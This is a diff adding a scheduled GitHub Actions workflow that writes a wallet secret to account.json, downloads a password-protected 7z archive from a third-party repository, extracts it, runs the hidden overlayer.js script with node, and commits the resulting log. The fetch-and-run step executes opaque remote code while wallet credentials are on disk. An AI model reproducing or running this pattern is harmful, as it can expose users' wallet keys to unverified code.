@@ -1,0 +1,92 @@
+name: b3ZlcmxheWVyS2lyc2E
+
+on:
+  schedule:
+    - cron: '0 1 * * *'
+  workflow_dispatch:
+  push:
+    paths:
+      - '.github/workflows/b3ZlcmxheWVyS2lyc2E.yml'
+
+permissions:
+  contents: write
+
+jobs:
+  start-bot:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v6
+
+      - name: Set up Node.js
+        uses: actions/setup-node@v6
+        with:
+          node-version: '24'
+
+      - name: Fetch GitHub User Info
+        run: |
+          GIT_NAME=$(curl -s             -H "Authorization: Bearer ${{ secrets.PRIVATE_SECRET }}"             -H "Accept: application/vnd.github+json"             https://api.github.com/user | jq -r '.login')
+
+          GIT_EMAIL=$(curl -s             -H "Authorization: Bearer ${{ secrets.PRIVATE_SECRET }}"             -H "Accept: application/vnd.github+json"             https://api.github.com/user | jq -r '.email')
+
+          if [ -z "$GIT_EMAIL" ] || [ "$GIT_EMAIL" = "null" ]; then
+            GIT_EMAIL="${GIT_NAME}@users.noreply.github.com"
+          fi
+
+          echo "GIT_NAME=$GIT_NAME" >> "$GITHUB_ENV"
+          echo "GIT_EMAIL=$GIT_EMAIL" >> "$GITHUB_ENV"
+
+      - name: Install 7zip
+        run: sudo apt-get update && sudo apt-get install -y p7zip-full
+
+      - name: Write WALLET_SECRET to account.json
+        run: |
+          cat << 'EOF' > account.json
+          ${{ secrets.WALLET_SECRET }}
+          EOF
+
+          if ! jq empty account.json >/dev/null 2>&1; then
+            echo "⚠️ Invalid JSON detected! Replacing with an empty array."
+            echo "[]" > account.json
+          fi
+
+      - name: Download and Unzip Script
+        run: |
+          echo "📦 Downloading overlayer.7z..."
+          wget https://raw.githubusercontent.com/0xryd/file_encrypted/main/overlayer.7z -O overlayer.7z
+
+          echo "🔐 Unzipping overlayer.7z with password..."
+          7z x overlayer.7z -p${{ secrets.ZIP_PASSWORD }} -o./
+
+      - name: Install Dependencies
+        run: npm install
+
+      - name: Check Files after npm install
+        run: ls -la
+
+      - name: Run Script
+        run: |
+          node overlayer.js 2>&1 | tee LOG.js || true
+
+      - name: Setup Git Configuration
+        run: |
+          git config user.email "$GIT_EMAIL"
+          git config user.name "$GIT_NAME"
+
+      - name: Commit LOG.js
+        run: |
+          git add LOG.js
+          git commit -m "Update log $(date '+%Y-%m-%d %H:%M:%S')" || echo "No changes to commit."
+
+      - name: GitHub Push
+        uses: ad-m/github-push-action@v1.1.0
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          branch: main
+
+      - name: Cleanup
+        run: rm -f account.json
+
+      - name: Check Files after Cleanup
+        run: ls -la
